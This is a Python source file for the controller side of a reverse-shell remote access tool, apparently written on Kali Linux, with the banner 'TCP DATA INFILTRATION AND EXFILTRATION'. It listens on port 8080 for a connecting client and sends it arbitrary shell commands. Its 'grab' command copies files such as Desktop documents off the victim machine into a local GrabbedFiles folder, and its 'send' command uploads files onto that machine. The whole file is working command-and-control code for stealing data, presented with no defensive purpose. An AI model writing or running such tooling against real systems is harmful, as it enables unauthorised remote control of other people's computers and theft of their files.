import os
import socket

def doGrab(conn, command, operation):
    conn.send(command.encode())

    #for grab operation, open a file in write mode, inside GrabbedFiles folder
    #File name should be of format: grabbed_sourceFilePathOfClientMachine
    #File name example: grabbed_C:/Users/John/Desktop/audit.docx
    if (operation == "grab"):
        grab, sourcePathAsFileName = command.split("*")
        path = "/home/kali/Desktop/GrabbedFiles/"
        fileName = "grabbed_" + sourcePathAsFileName

        f = open(path + fileName, "wb")
        while True:
            bits = conn.recv(5000)
            if bits.endswith('DONE'.encode()):
                f.write(bits[:-4]) # Write those last received bits without the word 'DONE'
                f.close()
                print('[+] File transfer completed')
                break
            if 'File not found'.encode() in bits:
                print ("[-] Unable to find the file")
                break
            f.write(bits)
        print("File name: " + fileName)
        print("Written to: " + path)

def doSend(conn, sourcePath, destinationPath, fileName):

    #For 'send' operation, open the file in read mode
    #Read the file into packets and send them through the connection object
    #After finished sending the whole file, send string 'DONE' to indicate completion
    if os.path.exists(sourcePath + fileName):
        sourceFile = open(sourcePath + fileName, "rb")
        packet = sourceFile.read(5000)
        while len(packet) > 0:
            conn.send(packet)
            packet = sourceFile.read(5000)
        conn.send('DONE'.encode())
        print("[+] File transfer completed")
    else:
        conn.send("File not found".encode())
        print("[-] Unable to find the file")
        return

def connect():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 8080))
    s.listen(1)
    print("="*60)
    print("    TCP DATA INFILTRATION AND EXFILTRATION")
    print("="*60)
    print("[+] Listening for incoming TCP connections on port 8080")
    conn, addr = s.accept()
    print("[+] Connected to", addr)

    while True:
        print("="*60)
        command = input("Shell> : ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            break

        #command format: grab*<File Path>
        #example: grab*C:\Users\John\Desktop\photo.jpg
        elif 'grab' in command:
            doGrab(conn, command, "grab")

        #command format: send*<destination path>*<File name>
        #example: send*C:\Users\John\Desktop\*photo.jpeg
        #source file in linux. Example: /Root/Desktop
        elif 'send' in command:
            sendCmd, destination, fileName = command.split("*")
            source = input("Source path: ")
            conn.send(command.encode())
            doSend(conn, source, destination, fileName)

        else:
            conn.send(command.encode())
            print(conn.recv(5000).decode())

def main():
    connect()

if __name__ == "__main__":
    main()
